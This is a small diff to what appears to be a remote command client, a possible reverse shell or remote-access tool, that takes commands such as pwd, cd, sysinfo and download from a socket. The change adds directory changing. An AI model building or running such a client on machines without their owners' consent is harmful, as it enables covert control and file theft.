@@ -16,7 +16,10 @@ def run(host, port):
             elif command == "pwd":
                 pwd(client_socket)
             elif command[:2] == "cd":
-                pass
+                try:
+                    os.chdir(command[3:])
+                except:
+                    continue
             elif command == "sysinfo":
                 pass
             elif command[:8] == "download":
